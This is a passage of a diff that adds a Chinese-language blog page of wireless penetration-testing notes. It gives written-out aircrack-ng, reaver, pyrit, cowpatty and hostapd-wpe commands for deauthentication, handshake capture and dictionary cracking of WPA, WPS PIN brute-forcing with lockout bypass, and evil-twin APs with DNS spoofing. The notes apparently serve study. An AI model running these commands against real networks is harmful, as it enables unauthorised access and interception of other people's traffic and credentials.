+<li>无客户端情况下此攻击无效</li>
+</ul>
+</li>
+<li><code>aireplay-ng -0 0 -a &lt;AP MAC&gt; -c &lt;Client MAC&gt; &lt;interface name&gt;</code></li>
+<li><ul>
+<li>不指定-c 参数时，以广播攻击所有客户端</li>
+<li>每攻击发送128个包，64个给AP，64个给客户端</li>
+<li>物理足够接近被攻击者</li>
+<li>与被攻击者使用相同无线标准b\n\g</li>
+<li>客户端可能拒绝广播帧，建议指定客户端</li>
+</ul>
+</li>
+</ul>
+<h5 id="ARP重放"><a href="#ARP重放" class="headerlink" title="ARP重放"></a>ARP重放</h5><ul>
+<li>侦听正常的ARP包并重放给AP</li>
+<li>AP回包中包含大量弱IV</li>
+<li><code>aireplay-ng -3 -b &lt;AP MAC&gt; -h &lt;Source MAC&gt;&lt;interface name&gt;</code></li>
+<li><ul>
+<li>-h 合法客户端/供给者MAC</li>
+</ul>
+</li>
+<li>Airodump-ng data 字段</li>
+<li><ul>
+<li>64bit密钥 ： 25万</li>
+<li>128bit密钥： 150万</li>
+</ul>
+</li>
+<li><code>airecrack-ng wep.cap</code></li>
+</ul>
+<h4 id="WPA-攻击"><a href="#WPA-攻击" class="headerlink" title="WPA 攻击"></a>WPA 攻击</h4><p><code>HTTP://ETUTORIALS.ORG/NETWORKING/802.11+SECURITY.+WI-FI+PROTECTED+ACCESS+AND+802.11I/</code></p>
+<h5 id="WPA-PSK-攻击"><a href="#WPA-PSK-攻击" class="headerlink" title="WPA PSK 攻击"></a>WPA PSK 攻击</h5><ul>
+<li>只有一种密码破解方法</li>
+<li><ul>
+<li>WPA不存在WEP的弱点</li>
+</ul>
+</li>
+<li>只能暴力破解</li>
+<li><ul>
+<li>CPU资源</li>
+<li>时间</li>
+<li>字典质量</li>
+<li><ul>
+<li>网上共享的字典</li>
+<li>泄露密码</li>
+<li>地区电话号码段</li>
+<li>Crunch生成字典</li>
+<li>Kali自带的字典文件</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>PSK破解过程</li>
+<li><ul>
+<li>启动monitor</li>
+<li>开始抓包并保存</li>
+<li>Deauthentication 攻击获取4步握手信息</li>
+<li>使用字典暴力破解</li>
+</ul>
+</li>
+<li>无AP情况下的WPA密码破解</li>
+<li><ul>
+<li>启动monitor</li>
+<li>开始抓包并保存</li>
+<li>根据probe信息伪造相同ESSID的AP</li>
+<li>抓取4步握手中的前两个包</li>
+<li>使用字典暴力破解</li>
+</ul>
+</li>
+<li>AIROLIB破解密码</li>
+<li><ul>
+<li>设计用于存储ESSID和密码列表</li>
+<li><ul>
+<li>计算生成不变的PMK（计算资源消耗型）</li>
+<li>PMK在破解阶段被用于计算PTK（速度快，计算资源要求少）</li>
+<li>通过完整性摘要值破解密码</li>
+<li>SQLite3数据库存储数据</li>
+</ul>
+</li>
+<li><code>echo kifi &gt; essid.txt</code></li>
+<li><code>airolib-ng db --import essid essid.txt</code></li>
+<li><code>airolib-ng db --stats</code></li>
+<li><code>airolib-ng db --import passwd &lt;wordlist&gt;</code></li>
+<li><ul>
+<li>自动剔除不合格的WPA字典</li>
+</ul>
+</li>
+<li><code>airolib-ng db –batch</code></li>
+<li><ul>
+<li>生成PMK</li>
+</ul>
+</li>
+<li><code>aircrack-ng -r db wpa.cap</code></li>
+</ul>
+</li>
+<li>JTR 破解密码</li>
+<li><ul>
+<li>John the ripper</li>
+<li><ul>
+<li>快速的密码破解软件</li>
+<li>支持基于规则扩展密码字典</li>
+</ul>
+</li>
+<li>很多人喜欢用手机号码做无线密码</li>
+<li><ul>
+<li>获取号段并利用JTR规则增加最后几位的数字</li>
+</ul>
+</li>
+<li>配置文件 /etc/john/john.conf</li>
+<li><ul>
+<li><code>[List.Rules:Wordlist]</code></li>
+<li><code>$[0-9]$[0-9]$[0-9]</code></li>
+</ul>
+</li>
+<li>测试效果</li>
+<li><ul>
+<li><code>john --wordlist=password.lst --rules --stdout | grep -i Password123</code></li>
+</ul>
+</li>
+<li>破解调用</li>
+<li><ul>
+<li><code>john --wordlist=pass.list --rules --stdout | aircrack-ng -e kifi -w - wpa.cap</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>COWPATTY 破解密码</li>
+<li><ul>
+<li>WPA密码通用破解工具</li>
+<li>使用密码字典</li>
+<li><ul>
+<li><code>cowpatty -r wpa.cap -f password.lst -s kifi</code></li>
+</ul>
+</li>
+<li>使用彩虹表（PMK）</li>
+<li><ul>
+<li><code>genpmk -f password.lst -d pmkhash -s kifi</code></li>
+<li><code>cowpatty -r wpa.cap -d pmkhash -s kifi</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>PYRIT 破解密码</li>
+<li><ul>
+<li>与airolib\ cowpatty 相同，支持基于预计算的PMK提高破解速度</li>
+<li>独有的优势</li>
+<li><ul>
+<li>除CPU之外Pyrit 可以运用GPU的强大运算能力加速生成PMK</li>
+<li>本身支持抓包获取四步握手过程，无需用Airodum抓包</li>
+<li>也支持传统的读取airodump抓包获取四步握手方式</li>
+</ul>
+</li>
+<li>只抓取WAP四次握手过程包</li>
+<li><ul>
+<li><code>pyrit -r wlan2mon -o wpapyrit.cap stripLive</code></li>
+<li><code>pyrit -r wpapyrit.cap analyze</code></li>
+</ul>
+</li>
+<li>从airodump 抓包导入并筛选</li>
+<li><ul>
+<li><code>pyrit -r wpa.cap -o wpapyrit.cap strip</code></li>
+</ul>
+</li>
+<li>使用密码字典直接破解</li>
+<li><ul>
+<li><code>pyrit -r wpapyrit.cap -i password.lst -b &lt;AP MAC&gt; attack_passthrough</code></li>
+</ul>
+</li>
+<li>数据库模式破解</li>
+<li><ul>
+<li>默认使用基于文件的数据库，支持连接SQL数据库，将计算的PMK存入数据库</li>
+<li>查看默认数据库状态： <code>pyrit eval</code></li>
+<li>导入密码字典： <code>pyrit -i password.lst import_passwords</code> (剔除了不合规的密码)</li>
+<li>指定ESSID： <code>pyrit -e kifi create_essid</code></li>
+<li>计算PMK： <code>pyrit batch</code> (发挥GPU计算能力)</li>
+<li>破解密码： <code>pyrit -r wpapyrit.cap -b &lt;AP MAC&gt; attack_db</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="WPS-攻击"><a href="#WPS-攻击" class="headerlink" title="WPS 攻击"></a>WPS 攻击</h4><ul>
+<li>WPS是WiFi联盟2006年开发的一项技术</li>
+<li><ul>
+<li>通过PIN码来简化无线接入的操作，无需记住PSK</li>
+<li>路由器和网卡各按一个按钮就能接入无线</li>
+<li>PIN码是分为前后各4位的2段共8位数字</li>
+</ul>
+</li>
+<li>安全漏洞</li>
+<li><ul>
+<li>2011年被发现安全涉及漏洞</li>
+<li>接入发起方可以根据路由器的返回信息判断前4位是否正确</li>
+<li>而PIN码的后4位只有1000种定义的组合（最后一位是checksum)</li>
+<li>所以全部穷举破解只需要11000次尝试</li>
+<li><ul>
+<li>PSK：218，340，105，584，896</li>
+</ul>
+</li>
+<li>标准本身没有设计锁定机制，目前多个厂商已实现锁定机制</li>
+</ul>
+</li>
+<li>包括Linksys 在内的很多厂家的无线路由器无法关闭WPS功能</li>
+<li>即使在web界面中关闭WPS，配置也不会生效</li>
+<li>攻击难度相对较低，防御却十分困难</li>
+<li>一般可在4-10小时爆破密码</li>
+<li><ul>
+<li>PSK</li>
+</ul>
+</li>
+<li>用计算器直接算出PIN</li>
+<li><ul>
+<li>C83A35</li>
+<li>00B00C</li>
+</ul>
+</li>
+<li>启动侦听模式后，发现支持WPS的AP</li>
+<li><ul>
+<li><code>wash -C -i wlan0mon</code></li>
+<li><code>airodump-ng wlan0mon --wps</code></li>
+</ul>
+</li>
+<li>爆破PIN码</li>
+<li><ul>
+<li><code>reaver -i wlan0mon -b &lt;AP mac&gt; -vv</code></li>
+</ul>
+</li>
+<li>秒破PIN码</li>
+<li><ul>
+<li><code>reaver -i wlan0mon -b &lt;AP mac&gt; -vv -K 1</code></li>
+<li>pixiewps</li>
+<li>只适用与固定厂商的芯片，成功率很低</li>
+</ul>
+</li>
+<li><code>reaver -i wlan0mon -b &lt;AP mac&gt; -vv -p 88888888</code></li>
+<li>问题：</li>
+<li><ul>
+<li>很多厂家实现了锁定机制，所以爆破时应注意限速</li>
+<li>一旦触发锁定，可尝试耗尽AP连接数，令其重启并解除WPS锁定</li>
+</ul>
+</li>
+<li>综合自动无线密码破解工具 wifite</li>
+</ul>
+<h5 id="EVIL-TWIN-AP-ROGUE-AP"><a href="#EVIL-TWIN-AP-ROGUE-AP" class="headerlink" title="EVIL TWIN AP / ROGUE AP"></a>EVIL TWIN AP / ROGUE AP</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">airbase-ng -a &lt;AP mac&gt; --essid “kifi” -c 11 wlan2mon</span><br><span class="line">apt-get install bridge-utils</span><br><span class="line">brctl addbr bridge</span><br><span class="line">brctl addif Wifi-Bridge eth0</span><br><span class="line">brctl addif Wifi-Bridge at0</span><br><span class="line">ifconfig eth0 0.0.0.0 up</span><br><span class="line">ifconfig at0 0.0.0.0 up</span><br><span class="line">ifconfig bridge 192.168.1.10 up</span><br><span class="line">route add -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.1.1</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">dnspoof -i bridge -f dnsspoof.hosts</span><br><span class="line">• /usr/share/dsniff/dnsspoof.hosts</span><br><span class="line">apachet2ctl start</span><br></pre></td></tr></table></figure>
+<ul>
+<li>3vilTwinAttacker<br><code>git clone https://github.com/P0cL4bs/3vilTwinAttacker.git</code><br><code>cd 3vilTwinAttacker</code><br><code>chmod +x installer.sh</code><br><code>./installer.sh --install</code></li>
+</ul>
+<h5 id="WPA企业"><a href="#WPA企业" class="headerlink" title="WPA企业"></a>WPA企业</h5><ul>
+<li>hostapd-wpe</li>
+<li>取代了 FreeRADIUS-wpe</li>
+<li>EAP-FAST/MSCHAPv2 (Phase 0)</li>
+<li>PEAP/MSCHAPv2</li>
+<li>EAP-TTLS/MSCHAPv2</li>
+<li>EAP-TTLS/MSCHAP</li>
+<li>EAP-TTLS/CHAP</li>
+<li>EAP-TTLS/PAP</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/OpenSecurityResearch/hostapd-wpe</span><br><span class="line">apt-get install libssl-dev libnl-dev</span><br><span class="line">libnl1 libnl-dev 包不在 kali2.0的官方库中</span><br><span class="line">wget http://ftp.debian.org/debian/pool/main/libn/libnl/libnl-dev_1.1-7_amd64.deb</span><br><span class="line">wget http://ftp.debian.org/debian/pool/main/libn/libnl/</span><br><span class="line">libnl1_1.1-7_amd64.deb</span><br><span class="line">dpkg -i libnl1_1.1-7_amd64.deb</span><br><span class="line">dpkg -i libnl-dev_1.1-7_amd64.deb</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget http://hostap.epitest.fi/releases/hostapd-2.2.tar.gz</span><br><span class="line">tar -zxf hostapd-2.2.tar.gz</span><br><span class="line">cd hostapd-2.2</span><br><span class="line">patch -p1 &lt; ../hostapd-wpe/hostapd-wpe.patch</span><br><span class="line">cd hostapd</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+<ul>
+<li>生成证书</li>
+<li><ul>
+<li><code>cd ../../hostapd-wpe/certs</code><br><code>./bootstrap</code></li>
+<li><code>service network-manager stop</code></li>
+<li><code>airmon-ng check kill</code></li>
+<li>映射无线网卡</li>
+<li><code>ifconfig wlan0 up</code></li>
+<li>启动伪造AP</li>
+<li><code>cd ../../hostapd-2.2/hostapd</code></li>
+<li><code>./hostapd-wpe hostapd-wpe.conf</code></li>
+<li><code>asleap -C challenge -R response -W &lt;Dictionary_File&gt;</code></li>
+</ul>
+</li>
+</ul>
+<h5 id="AIRDECAP-NG"><a href="#AIRDECAP-NG" class="headerlink" title="AIRDECAP-NG"></a>AIRDECAP-NG</h5><ul>
+<li>去除802.11头</li>
+<li><ul>
+<li><code>airdecap-ng -b &lt;AP MAC&gt; 1.pcap</code></li>
+</ul>
+</li>
+<li>解密WEP加密数据</li>
+<li><ul>
+<li><code>airdecap-ng -w &lt;WEP key&gt;-b &lt;AP MAC&gt; 1.pcap</code></li>
+<li>必须有与AP建立关联关系</li>
+</ul>
+</li>
+<li>解密WPA加密数据</li>
+<li><ul>
+<li><code>airdecap-ng -e kifi -p &lt;PSK&gt; -b &lt;AP MAC&gt; 1.pcap</code></li>
+<li>抓包文件中必须包含4步握手信息，否则无解</li>
+</ul>
+</li>
+</ul>
+<h5 id="AIRSERV-NG"><a href="#AIRSERV-NG" class="headerlink" title="AIRSERV-NG"></a>AIRSERV-NG</h5><ul>
+<li>通过网络提供无线网卡服务器</li>
+<li><ul>
+<li>某些网卡不支持客户端/服务器模式</li>
+</ul>
+</li>
+<li>启动无线侦听</li>
+<li>服务器端</li>
+<li><ul>
+<li><code>airserv-ng -p 3333 -d wlan2mon</code></li>
+</ul>
+</li>
+<li>客户端</li>
+<li><ul>
+<li><code>airodump-ng 192.168.1.1:3333</code></li>
+</ul>
+</li>
+<li>某些防火墙会影响C/S间的通信</li>
+</ul>
+<h5 id="AIRTUN-NG"><a href="#AIRTUN-NG" class="headerlink" title="AIRTUN-NG"></a>AIRTUN-NG</h5><ul>
+<li>无线入侵检测wIDS</li>
+<li><ul>
+<li>无线密码和BSSID</li>
+<li>需要获取握手信息</li>
+</ul>
+</li>
+<li>中继和重放</li>
+<li><ul>
+<li>Repeate / Replay</li>
+</ul>
+</li>
+<li>wIDS</li>
+<li><ul>
+<li><code>WEP: airtun-ng -a &lt;AP MAC&gt; -w SKA wlan2mon</code></li>
+<li><code>WPA: airtun-ng -a &lt;AP MAC&gt; -p PSK -e kifi wlan2mon</code></li>
+<li><code>ifconfig at0 up</code></li>
+<li>四步握手</li>
+<li>理论上支持多AP的wIDS，但2个AP以上时可靠性会下降</li>
+<li><ul>
+<li><code>WPA: airtun-ng -a &lt;AP MAC&gt; -p PSK -e kifi1 wlan2mon</code></li>
+<li><code>ifconfig at1 up</code></li>
+<li>多AP不同信道时 airodump -c 1,11 wlan2mon</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Repeate</li>
+<li><ul>
+<li>WDS/Bridge</li>
+<li>扩展无线侦听的距离</li>
+<li>要求两块网卡都置入monitor模式</li>
+<li><code>airtun-ng -a &lt;AP MAC&gt; --repeat --bssid &lt;AP MAC&gt; -i wlan0mon wlan2mon</code></li>
+<li>wlan0mon: 收包的网卡</li>
+<li>wlan2mon：发包的网卡</li>
+<li>-a: 发包的源地址</li>
+<li>–bssid: 过滤只发指定源地址的包（可选）</li>
+</ul>
+</li>
+<li>Replay<ul>
+<li>将抓取的CAP文件重放到指定网卡</li>
+<li><code>airtun-ng -a &lt;Source MAC&gt; -r 1.cap &lt;interface&gt;</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h4><ul>
+<li>bessid-ng</li>
+<li>fern-wifi-cracker</li>
+<li>kismet<ul>
+<li>kismet*.nettxt</li>
+<li>kismet*.pcapdump</li>
+</ul>
+</li>
+<li><code>gpsd -n -N -D4 /dev/ttyUSB0</code></li>
+<li><code>giskismet -x Kismet-*.netxml</code></li>
+<li><code>giskismet -q &quot;select * from wireless&quot; -o gps.kml</code></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#无线通信过程"><span class="toc-number">1.</span> <span class="toc-text">无线通信过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#连接到无线网络"><span class="toc-number">1.0.1.</span> <span class="toc-text">连接到无线网络</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WEP-探测过程"><span class="toc-number">1.0.2.</span> <span class="toc-text">WEP 探测过程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WPA探测过程"><span class="toc-number">1.0.3.</span> <span class="toc-text">WPA探测过程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WEP-OPEN认证过程"><span class="toc-number">1.0.4.</span> <span class="toc-text">WEP OPEN认证过程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WEP-PSK认证过程"><span class="toc-number">1.0.5.</span> <span class="toc-text">WEP PSK认证过程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WEP-共享密钥认证过程"><span class="toc-number">1.0.6.</span> <span class="toc-text">WEP 共享密钥认证过程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#加密"><span class="toc-number">1.0.7.</span> <span class="toc-text">加密</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#OPEN无加密网络"><span class="toc-number">1.0.8.</span> <span class="toc-text">OPEN无加密网络</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WEP加密系统"><span class="toc-number">1.0.9.</span> <span class="toc-text">WEP加密系统</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RC4算法"><span class="toc-number">1.0.10.</span> <span class="toc-text">RC4算法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WPA安全系统"><span class="toc-number">1.0.11.</span> <span class="toc-text">WPA安全系统</span></a></li></ol></li></ol><li class="toc-item toc-level-3"><a class="toc-link" href="#无线渗透实操"><span class="toc-number">2.</span> <span class="toc-text">无线渗透实操</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#AIRODUMP-NG排错"><span class="toc-number">2.1.</span> <span class="toc-text">AIRODUMP-NG排错</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#AIREPLAY-NG"><span class="toc-number">2.1.1.</span> <span class="toc-text">AIREPLAY-NG</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AIREPLAY-NG-排错"><span class="toc-number">2.1.2.</span> <span class="toc-text">AIREPLAY-NG 排错</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AIREPLAY-NG-包注入测试"><span class="toc-number">2.1.3.</span> <span class="toc-text">AIREPLAY-NG 包注入测试</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MAC地址绑定攻击"><span class="toc-number">2.1.4.</span> <span class="toc-text">MAC地址绑定攻击</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WEP攻击"><span class="toc-number">2.2.</span> <span class="toc-text">WEP攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Deautnentication-攻击"><span class="toc-number">2.2.1.</span> <span class="toc-text">Deautnentication 攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ARP重放"><span class="toc-number">2.2.2.</span> <span class="toc-text">ARP重放</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WPA-攻击"><span class="toc-number">2.3.</span> <span class="toc-text">WPA 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#WPA-PSK-攻击"><span class="toc-number">2.3.1.</span> <span class="toc-text">WPA PSK 攻击</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WPS-攻击"><span class="toc-number">2.4.</span> <span class="toc-text">WPS 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#EVIL-TWIN-AP-ROGUE-AP"><span class="toc-number">2.4.1.</span> <span class="toc-text">EVIL TWIN AP / ROGUE AP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WPA企业"><span class="toc-number">2.4.2.</span> <span class="toc-text">WPA企业</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AIRDECAP-NG"><span class="toc-number">2.4.3.</span> <span class="toc-text">AIRDECAP-NG</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AIRSERV-NG"><span class="toc-number">2.4.4.</span> <span class="toc-text">AIRSERV-NG</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AIRTUN-NG"><span class="toc-number">2.4.5.</span> <span class="toc-text">AIRTUN-NG</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#其他工具"><span class="toc-number">2.5.</span> <span class="toc-text">其他工具</span></a></li></ol></li>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/04/01/无线渗透/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/04/01/无线渗透/&text=无线渗透"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/04/01/无线渗透/&title=无线渗透"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/04/01/无线渗透/&is_video=false&description=无线渗透"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=无线渗透&body=Check out this article: http://yoursite.com/2018/04/01/无线渗透/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/04/01/无线渗透/&title=无线渗透"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/04/01/无线渗透/&title=无线渗透"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/04/01/无线渗透/&title=无线渗透"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/04/01/无线渗透/&title=无线渗透"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/04/01/无线渗透/&name=无线渗透&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 jsmhny
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
